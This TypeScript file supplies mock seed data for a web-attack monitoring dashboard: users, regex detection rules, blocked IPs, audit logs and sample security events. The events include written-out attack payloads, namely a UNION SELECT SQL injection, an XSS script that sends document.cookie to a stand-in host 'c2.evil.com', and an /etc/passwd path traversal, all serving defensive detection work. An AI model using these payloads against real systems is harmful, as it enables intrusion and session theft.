import { SecurityEvent, BlockedIp, DetectionRule, AuditLogEntry, User } from '../types/security';

export const INITIAL_USERS: User[] = [
  {
    id: 1,
    username: 'admin',
    email: 'admin@zeroattack.sec',
    role: 'ADMIN',
    isActive: true,
    lastLogin: '2026-09-24 06:15:20'
  },
  {
    id: 2,
    username: 'analyst',
    email: 'analyst@zeroattack.sec',
    role: 'SECURITY ANALYST',
    isActive: true,
    lastLogin: '2026-09-24 05:45:10'
  },
  {
    id: 3,
    username: 'viewer',
    email: 'viewer@zeroattack.sec',
    role: 'VIEWER',
    isActive: true,
    lastLogin: '2026-09-23 18:30:00'
  }
];

export const INITIAL_RULES: DetectionRule[] = [
  {
    id: 1,
    name: 'Classic SQL Injection (OR 1=1 Tautology)',
    attackType: 'SQL Injection',
    pattern: "(?i)((\\%27)|('))\\s*(or|and)\\s+(\\d+|\\'\\w+\\')\\s*=\\s*(\\d+|\\'\\w+\\')",
    targetField: 'ALL',
    description: 'Detects boolean tautology exploits designed to bypass authentication predicates',
    severity: 'CRITICAL',
    riskWeight: 85,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  },
  {
    id: 2,
    name: 'SQL UNION SELECT Data Exfiltration',
    attackType: 'SQL Injection',
    pattern: "(?i)\\bunion\\s+(all\\s+)?select\\b",
    targetField: 'ALL',
    description: 'Catches unauthorized schema extraction via UNION-based query stacking',
    severity: 'CRITICAL',
    riskWeight: 90,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  },
  {
    id: 3,
    name: 'Stored & Reflected Script Tags (XSS)',
    attackType: 'Cross-Site Scripting (XSS)',
    pattern: "(?i)<\\s*script[^>]*>.*?(<\\s*/\\s*script\\s*>)?",
    targetField: 'ALL',
    description: 'Detects direct script injection into DOM markup streams',
    severity: 'HIGH',
    riskWeight: 75,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  },
  {
    id: 4,
    name: 'DOM Event Handler Injection (XSS)',
    attackType: 'Cross-Site Scripting (XSS)',
    pattern: "(?i)\\bon(load|error|click|mouseover)\\s*=",
    targetField: 'ALL',
    description: 'Detects SVG/IMG event listener attributes hijacked for execution',
    severity: 'HIGH',
    riskWeight: 70,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  },
  {
    id: 5,
    name: 'Directory / Path Traversal Attack',
    attackType: 'Parameter Tampering',
    pattern: "(?i)(\\.\\./|\\.\\.\\\\|/etc/passwd|win\\.ini)",
    targetField: 'URL',
    description: 'Detects directory escape sequences attempting to access host filesystem',
    severity: 'HIGH',
    riskWeight: 75,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  },
  {
    id: 6,
    name: 'Administrative Role Elevation Tampering',
    attackType: 'Parameter Tampering',
    pattern: "(?i)\\b(is_admin|isAdmin|role|privilege)\\s*=\\s*(1|true|admin|root)\\b",
    targetField: 'PARAMETERS',
    description: 'Detects query manipulation attempting unauthorized privilege grant',
    severity: 'MEDIUM',
    riskWeight: 50,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  },
  {
    id: 7,
    name: 'Automated Vulnerability Scanner Fingerprints',
    attackType: 'Anomaly Detection',
    pattern: "(?i)(sqlmap|nikto|acunetix|nessus|nmap|dirbuster|gobuster)",
    targetField: 'HEADERS',
    description: 'Identifies known security auditing toolkits and vulnerability scanners',
    severity: 'HIGH',
    riskWeight: 65,
    isActive: true,
    createdAt: '2026-09-01 10:00:00'
  }
];

export const INITIAL_BLOCKED_IPS: BlockedIp[] = [
  {
    id: 1,
    ipAddress: '198.51.100.42',
    reason: 'Automated SQL Injection (UNION SELECT + schema dump attempt)',
    riskScore: 92,
    blockedAt: '2026-09-24 06:12:00',
    expiresAt: '2026-09-24 06:42:00',
    status: 'ACTIVE',
    blockedBy: 'SYSTEM_AUTO_BLOCK'
  },
  {
    id: 2,
    ipAddress: '203.0.113.89',
    reason: 'Brute-force credential stuffing burst (42 auth attempts/min)',
    riskScore: 88,
    blockedAt: '2026-09-24 05:58:30',
    expiresAt: '2026-09-24 06:28:30',
    status: 'ACTIVE',
    blockedBy: 'SYSTEM_AUTO_BLOCK'
  },
  {
    id: 3,
    ipAddress: '192.0.2.77',
    reason: 'Path traversal probe targeting /etc/shadow with curl headless client',
    riskScore: 82,
    blockedAt: '2026-09-24 05:30:15',
    expiresAt: '2026-09-24 06:00:15',
    status: 'EXPIRED',
    blockedBy: 'admin'
  }
];

export const INITIAL_AUDIT_LOGS: AuditLogEntry[] = [
  {
    id: 1,
    timestamp: '2026-09-24 06:15:20',
    username: 'admin',
    action: 'LOGIN',
    target: 'SESSION',
    ipAddress: '127.0.0.1',
    details: 'Administrator authenticated via secure session'
  },
  {
    id: 2,
    timestamp: '2026-09-24 06:12:00',
    username: 'SYSTEM',
    action: 'AUTO_IP_BLOCK',
    target: '198.51.100.42',
    ipAddress: '198.51.100.42',
    details: 'Automated quarantine triggered for CRITICAL risk event (Score: 92)'
  },
  {
    id: 3,
    timestamp: '2026-09-24 05:58:30',
    username: 'SYSTEM',
    action: 'AUTO_IP_BLOCK',
    target: '203.0.113.89',
    ipAddress: '203.0.113.89',
    details: 'Automated quarantine triggered for Brute-force burst on /login'
  },
  {
    id: 4,
    timestamp: '2026-09-24 05:45:10',
    username: 'analyst',
    action: 'DECRYPT_PAYLOAD',
    target: 'EVENT_#101',
    ipAddress: '127.0.0.1',
    details: 'Authorized forensic decryption conducted on SQLi incident'
  }
];

export const INITIAL_EVENTS: SecurityEvent[] = [
  {
    id: 101,
    timestamp: '2026-09-24 06:11:58',
    sourceIp: '198.51.100.42',
    requestMethod: 'POST',
    requestUrl: '/api/v1/auth/login',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    attackType: 'SQL Injection',
    detectionMethod: 'HYBRID_ENGINE',
    riskScore: 92,
    severity: 'CRITICAL',
    actionTaken: 'BLOCKED',
    status: 'MITIGATED',
    detectionReason: "SQLi: UNION SELECT Extraction; Request Velocity Surge (38 req/min exceeds threshold)",
    encryptedPayload: 'U2FsdGVkX1+Q7j8xN9v2L5mV3jH1wQ0eR4tY6uI8oP9sA3dF5gH7jK4lM2nO1pQ==$9f8b2c4a1e7d',
    rawPayload: {
      method: 'POST',
      url: '/api/v1/auth/login',
      parameters: "username=admin' UNION SELECT 1,table_name,3 FROM information_schema.tables--&password=foo",
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
      frequency: 38
    },
    matchedIndicators: [
      {
        type: 'SQL Injection',
        label: 'SQLi: UNION SELECT Extraction',
        matchedText: 'UNION SELECT 1,table_name,3',
        weight: 90
      }
    ],
    anomalyFlags: [
      {
        factor: 'Request Velocity Surge',
        detail: '38 req/min exceeds threshold of 25 req/min (Z-Score: 4.82)',
        severityContrib: 45
      }
    ],
    decryptedPlaintext: '{"username": "admin\' UNION SELECT 1,table_name,3 FROM information_schema.tables--", "password": "foo", "client_ip": "198.51.100.42"}'
  },
  {
    id: 102,
    timestamp: '2026-09-24 05:58:25',
    sourceIp: '203.0.113.89',
    requestMethod: 'POST',
    requestUrl: '/api/v1/user/auth',
    userAgent: 'Python-urllib/3.10',
    attackType: 'Brute Force',
    detectionMethod: 'ANOMALY_DETECTION',
    riskScore: 88,
    severity: 'CRITICAL',
    actionTaken: 'BLOCKED',
    status: 'MITIGATED',
    detectionReason: 'Brute-Force Login Pattern: 42 consecutive credential authentication attempts within 60s window',
    encryptedPayload: 'U2FsdGVkX1/7aM9Kp1L3v8wQ0eR4tY6uI8oP9sA3dF5gH7jK4lM2nO1pQ8vB4z==$3a7c1e5f9d2b',
    rawPayload: {
      method: 'POST',
      url: '/api/v1/user/auth',
      parameters: 'username=administrator&password=Password2026!',
      userAgent: 'Python-urllib/3.10',
      frequency: 42
    },
    matchedIndicators: [],
    anomalyFlags: [
      {
        factor: 'Brute-Force Login Pattern',
        detail: 'Rapid authentication attempts (42 calls) targeting credential validation',
        severityContrib: 40
      },
      {
        factor: 'Request Velocity Surge',
        detail: '42 req/min exceeds threshold of 25 req/min (Z-Score: 5.12)',
        severityContrib: 45
      }
    ],
    decryptedPlaintext: '{"endpoint": "/api/v1/user/auth", "rapid_burst_count": 42, "payload_attempt": "username=administrator&password=Password2026!"}'
  },
  {
    id: 103,
    timestamp: '2026-09-24 05:42:12',
    sourceIp: '198.51.100.15',
    requestMethod: 'POST',
    requestUrl: '/blog/post/42/comment',
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
    attackType: 'Cross-Site Scripting (XSS)',
    detectionMethod: 'RULE_BASED',
    riskScore: 75,
    severity: 'HIGH',
    actionTaken: 'QUARANTINED',
    status: 'INVESTIGATING',
    detectionReason: "XSS: Raw Script Tag Injection (pattern match: '<script>document.location=...')",
    encryptedPayload: 'U2FsdGVkX18mN4k9p2L5mV3jH1wQ0eR4tY6uI8oP9sA3dF5gH7jK4lM2nO1pQ4kL==$8b3d2e6f4a1c',
    rawPayload: {
      method: 'POST',
      url: '/blog/post/42/comment',
      parameters: 'author=Alice&comment=<script>document.location="http://c2.evil.com/leak?cookie="+document.cookie</script>',
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
      frequency: 3
    },
    matchedIndicators: [
      {
        type: 'Cross-Site Scripting (XSS)',
        label: 'XSS: Raw Script Tag Injection',
        matchedText: '<script>document.location="http://c2.evil.com/leak?cookie="+document.cookie</script>',
        weight: 75
      }
    ],
    anomalyFlags: [],
    decryptedPlaintext: '{"author": "Alice", "comment": "<script>document.location=\\"http://c2.evil.com/leak?cookie=\\"+document.cookie</script>"}'
  },
  {
    id: 104,
    timestamp: '2026-09-24 05:30:10',
    sourceIp: '192.0.2.77',
    requestMethod: 'GET',
    requestUrl: '/file/download?path=../../../../etc/passwd',
    userAgent: 'curl/7.88.1',
    attackType: 'Parameter Tampering',
    detectionMethod: 'RULE_BASED',
    riskScore: 75,
    severity: 'HIGH',
    actionTaken: 'QUARANTINED',
    status: 'RESOLVED',
    detectionReason: "Tampering: Directory Traversal Path Token (pattern match: '../../../../etc/passwd')",
    encryptedPayload: 'U2FsdGVkX19k9p2L5mV3jH1wQ0eR4tY6uI8oP9sA3dF5gH7jK4lM2nO1pQ9xZ2==$1c4a7e9d2f5b',
    rawPayload: {
      method: 'GET',
      url: '/file/download?path=../../../../etc/passwd',
      parameters: 'path=../../../../etc/passwd',
      userAgent: 'curl/7.88.1',
      frequency: 4
    },
    matchedIndicators: [
      {
        type: 'Parameter Tampering',
        label: 'Tampering: Directory Traversal Path Token',
        matchedText: '../../../../etc/passwd',
        weight: 75
      }
    ],
    anomalyFlags: [],
    decryptedPlaintext: '{"target_path": "../../../../etc/passwd", "system_file": "/etc/passwd", "client": "curl/7.88.1"}'
  },
  {
    id: 105,
    timestamp: '2026-09-24 05:14:02',
    sourceIp: '198.51.100.99',
    requestMethod: 'GET',
    requestUrl: '/catalog/products?category=hardware&page=1',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    attackType: 'Normal Request',
    detectionMethod: 'RULE_BASED',
    riskScore: 5,
    severity: 'LOW',
    actionTaken: 'MONITORED',
    status: 'RESOLVED',
    detectionReason: 'No malicious signatures or behavioral anomalies identified.',
    encryptedPayload: 'U2FsdGVkX14mK8p2L5mV3jH1wQ0eR4tY6uI8oP9sA3dF5gH7jK4lM2nO1pQ0aB9==$2e5b8c1f4a9d',
    rawPayload: {
      method: 'GET',
      url: '/catalog/products?category=hardware&page=1',
      parameters: 'category=hardware&page=1',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      frequency: 2
    },
    matchedIndicators: [],
    anomalyFlags: [],
    decryptedPlaintext: '{"category": "hardware", "page": "1", "userAgent": "Mozilla/5.0 Chrome"}'
  }
];
